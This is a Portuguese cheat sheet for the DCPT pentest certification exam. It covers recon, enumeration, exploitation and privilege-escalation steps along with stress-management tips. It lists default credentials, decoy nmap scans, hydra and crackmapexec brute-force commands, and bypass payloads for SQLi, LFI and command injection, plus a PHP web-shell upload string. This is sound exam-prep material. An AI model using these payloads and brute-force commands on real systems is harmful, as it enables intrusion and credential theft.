# 🚀 Guia Rápido de Desbloqueio - DCPT

> **OBJETIVO**: Checklist rápido para te destravar quando estiver preso no exame.
> **Para comandos detalhados**: Consulte os outros arquivos de checklist.

---

## 🔑 CREDENCIAIS PADRÕES - TESTAR PRIMEIRO!

### Combinações Mais Comuns
```
admin:admin
admin:password
root:root
root:toor
administrator:administrator
guest:guest
user:user
ftp:ftp
anonymous:anonymous (FTP)
mysql:mysql
postgres:postgres
tomcat:tomcat
jenkins:jenkins
admin:Admin123
admin:Password1
root:password
admin:changeme
admin:letmein
```

**📌 AÇÃO**: Testar em TODOS os serviços encontrados (SSH, HTTP, FTP, SMB, MySQL, etc.)

---

## ⚡ OS 10 MANDAMENTOS - NUNCA ESQUECER!

1. ✅ **Nmap em modo STEALTH primeiro** → `nmap -D RND:20 -g53 -sS -Pn -p- IP`
2. ✅ **Burp Suite SEMPRE rodando** em background para web
3. ✅ **Mudar user-agent** em TODAS as ferramentas web
4. ✅ **Certificado SSL** → extrair domínios/subdomínios
5. ✅ **Código fonte completo** (Ctrl+U) + console.log (F12) de TODAS as páginas
6. ✅ **Credenciais padrões** em TODOS os serviços
7. ✅ **Fuzzing de parâmetros** em TODAS as rotas web
8. ✅ **Payloads COM bypass** (não só básico)
9. ✅ **Procurar domínios** em páginas, código fonte, certificados
10. ✅ **Nessus em background** para análise automática

---

## 🆘 CHECKLIST DE DESBLOQUEIO RÁPIDO

### 🔴 ESTOU TRAVADO! O QUE FAZER?

**1. PARE E RESPIRE (técnica 5-5-5)**
- 5 segundos inspirando
- 5 segundos segurando
- 5 segundos expirando
- Repita 3x

**2. VOLTE AO BÁSICO - Checklist de Reset:**
```
[ ] Testei credenciais padrões em TODOS os serviços?
[ ] Li TODO o código fonte de TODAS as páginas web?
[ ] Verifiquei console.log (F12) do navegador?
[ ] Olhei certificado SSL para domínios? (openssl s_client)
[ ] Procurei domínios no conteúdo das páginas?
[ ] Fiz fuzzing de parâmetros em TODAS as rotas?
[ ] Tentei brute force nos serviços?
[ ] Rodei Nessus?
[ ] Testei payloads com técnicas de bypass?
[ ] Burp está capturando requisições?
[ ] Mudei user-agent nas ferramentas?
```

**3. SE NADA ACIMA RESOLVEU:**
- [ ] Leia histórico bash se tiver shell (`.bash_history`, `.mysql_history`)
- [ ] Procure senhas em arquivos de config (`grep -r "password" /var/www/`)
- [ ] Rode LinPEAS/WinPEAS se tiver shell
- [ ] Verifique `sudo -l` e SUID (`find / -perm -u=s -type f 2>/dev/null`)
- [ ] Mude de alvo por 30 minutos e volte depois

---

## 📋 SEQUÊNCIA DE ATAQUE - PASSO A PASSO

### FASE 1: Reconhecimento (5-10 min)
```
[ ] Nmap stealth completo
[ ] Nmap detalhado nas portas abertas
[ ] UDP top 50 portas
[ ] Iniciar Nessus em background
```
**Referência**: [[01.01 - Varredura Completa]]

### FASE 2A: Web (se porta 80/443/8080)
```
[ ] Iniciar Burp Suite
[ ] Verificar certificado SSL para domínios
[ ] Ler TODO código fonte (Ctrl+U) e console.log (F12)
[ ] Procurar domínios/subdomínios no conteúdo
[ ] robots.txt, sitemap.xml, .git/HEAD, .env
[ ] Gobuster diretórios (COM user-agent customizado)
[ ] Se encontrar domínio: fuzzing de subdomínios/vhosts
[ ] Fuzzing de parâmetros em TODAS as rotas
[ ] Testar credenciais padrões em forms de login
```
**Referência**: [[02.01 - Enumeração Web Completa]]

### FASE 2B: Serviços
```
[ ] Testar credenciais padrões em CADA serviço
[ ] Se não funcionar: brute force com hydra
[ ] Enumerar cada serviço específico (ver referência)
```
**Referência**: [[02.02 - Enumeração de Serviços]]

### FASE 3: Exploração
```
[ ] Testar vulnerabilidades web (SQLi, LFI, RCE, Upload)
[ ] SEMPRE testar payloads COM técnicas de bypass
[ ] Procurar exploits para versões encontradas
[ ] Metasploit se souber exploit específico
```
**Referências**: [[03.02 - Exploração com Metasploit]] | [[03.01 - Exploração Web]]

### FASE 4: Pós-Exploração
```
[ ] PRIMEIRO: Melhorar shell (python TTY)
[ ] Enumerar sistema completo
[ ] LinPEAS/WinPEAS
[ ] Procurar senhas em arquivos
[ ] Ler históricos (.bash_history, .mysql_history)
```
**Referências**: [[04.01 - Pós-Exploração Linux]] | [[04.02 - Pós-Exploração Windows]]

### FASE 5: Escalação
```
[ ] sudo -l
[ ] SUID/SGID (gtfobins.github.io)
[ ] Capabilities
[ ] Cron jobs editáveis
[ ] Serviços com permissões fracas (Windows)
```
**Referência**: Veja os arquivos de pós-exploração

### FASE 6: Pivotagem (se necessário)
```
[ ] Descobrir redes internas (ip a, route, arp -a)
[ ] SSH tunneling ou Ligolo-ng
[ ] Repetir enumeração na rede interna
```
**Referência**: [[04.03 - Pivotagem e tunelamento]]

---

## 🧠 DICAS PSICOLÓGICAS - QUANDO TRAVAR

### Sintomas de "Tilt Mental"
- Rodando mesmo comando várias vezes
- Pulando entre alvos sem terminar
- Tentando exploits aleatórios
- Frustração/ansiedade crescendo

### Técnicas de Reset
1. **Break de 10 min** → levante, beba água, NÃO pense no problema
2. **Mude de alvo** → trabalhe 30min em outro, volte depois
3. **Rubber Duck** → explique o problema em voz alta
4. **Pergunte-se**: "O que eu ASSUMO que pode estar errado?"

### Hipótese: "Tentei tudo e nada funciona"

**Na verdade você NÃO:**
- [ ] Testou TODAS as credenciais padrões em TODOS os serviços
- [ ] Leu TODO o código fonte de TODAS as páginas
- [ ] Verificou console.log de TODAS as páginas
- [ ] Fez fuzzing de parâmetros em TODAS as rotas
- [ ] Procurou domínios no certificado SSL
- [ ] Testou payloads com técnicas de bypass
- [ ] Fez brute force em TODOS os serviços
- [ ] Rodou Nessus
- [ ] Rodou Burp Spider
- [ ] Procurou senhas em arquivos de config

**→ VOLTE e faça CADA item acima SISTEMATICAMENTE**

### Técnica da "Vitória Pequena"
1. Meta pequena: "Vou testar mais 5 credenciais"
2. Complete
3. Celebre mentalmente
4. Próxima meta pequena
5. Repita

---

## 🔥 LEMBRETES CRÍTICOS

### Enumeração Web
- [ ] **SEMPRE** Burp em background
- [ ] **SEMPRE** código fonte completo (Ctrl+U)
- [ ] **SEMPRE** console.log (F12)
- [ ] **SEMPRE** certificado SSL para domínios
- [ ] **SEMPRE** user-agent customizado
- [ ] **SEMPRE** fuzzing de parâmetros
- [ ] **SEMPRE** testar com bypass

### Comandos Essenciais
```bash
# Certificado SSL (domínios)
openssl s_client -connect IP:443 </dev/null 2>/dev/null | openssl x509 -text | grep -E "DNS:|Subject:"

# Domínio no /etc/hosts
echo "IP domain.com subdomain.domain.com" | sudo tee -a /etc/hosts

# Melhorar shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo;fg

# Procurar senhas
grep -r "password" /var/www/ 2>/dev/null
cat ~/.bash_history
```

### Brute Force Rápido
```bash
# SSH
hydra -l root -P passwords.txt ssh://IP

# HTTP POST
hydra -l admin -P passwords.txt IP http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# SMB
crackmapexec smb IP -u users.txt -p passwords.txt
```
**Referência completa**: [[03.03 - Brute Force e Quebra de Senhas]]

### Payloads COM Bypass
**SQLi**: `' OR 1=1-- -` | `'/**/OR/**/1=1--` | `' OR '1'='1`
**LFI**: `....//....//etc/passwd` | `../../../etc/passwd%00`
**CMD**: `cat${IFS}/etc/passwd` | `cat</etc/passwd`
**Upload**: `shell.php%00.jpg` | `shell.phtml` | `GIF89a <?php system($_GET['cmd']); ?>`

**Referência completa**: [[03.01 - Exploração Web]]

---

## 📊 GESTÃO DE TEMPO

### Priorização
1. **Quick wins** → credenciais padrão, exploits conhecidos
2. **Enumeração profunda** antes de exploits complexos
3. **NÃO fique > 1h travado** → mude de alvo
4. **Escalação > Novo alvo** → root em 2 > user em 4

### Se Tempo Acabando
```
[ ] PARE tentativas aleatórias
[ ] DOCUMENTE o que já tem
[ ] FOQUE nos alvos mais fáceis
[ ] CAPTURE evidências
[ ] ORGANIZE notas
```

---

## 💪 MINDSET VENCEDOR

### Afirmações
- "A enumeração tem a resposta"
- "Cada falha me aproxima da solução"
- "Eu sei fazer isso sistematicamente"
- "Um passo de cada vez"

### Quando Travar
**PARE → RESPIRE → VOLTE AO BÁSICO → ENUMERE MAIS**

### Lembre-se
- 80% é enumeração
- Outros candidatos também travam
- Você tem tempo suficiente
- Metodologia > velocidade
- Pequenos passos levam ao objetivo

---

## 🎯 SINAIS DE PROGRESSO

✅ Encontrou algo DIFERENTE/ESTRANHO
✅ Erro ESPECÍFICO (não genérico)
✅ Domínio/subdomínio novo
✅ Credenciais em qualquer lugar
✅ Upload funcionando
✅ LFI lendo arquivos
✅ SQLi retornando dados
✅ SUID/Sudo interessante

---

## 🏆 VOCÊ CONSEGUE!

> *"A diferença entre novato e expert é a metodologia, não o conhecimento."*

> *"Quando preso: não falta skill, falta enumeração. Volte aos basics."*

> *"Pentest = SISTEMÁTICO + PACIENTE, não rápido ou inteligente."*

**Você preparou. Você sabe. Confie no processo. VAI DAR CERTO! 💪🚀**

---

## 📚 ARQUIVOS DE REFERÊNCIA

- [[00 - Checklist Principal DCPT]] - Visão geral completa
- [[01.01 - Varredura Completa]] - Comandos nmap detalhados
- [[02.01 - Enumeração Web Completa]] - Fuzzing, análise web
- [[02.02 - Enumeração de Serviços]] - Enumerar cada serviço
- [[03.02 - Exploração com Metasploit]] - Uso do Metasploit
- [[04.01 - Pós-Exploração Linux]] - Linux pós-exploração
- [[04.02 - Pós-Exploração Windows]] - Windows pós-exploração
- [[03.01 - Exploração Web]] - SQLi, LFI, XSS, etc.
- [[03.03 - Brute Force e Quebra de Senhas]] - Hydra, hashcat
- [[04.03 - Pivotagem e tunelamento]] - SSH tunneling, Ligolo-ng
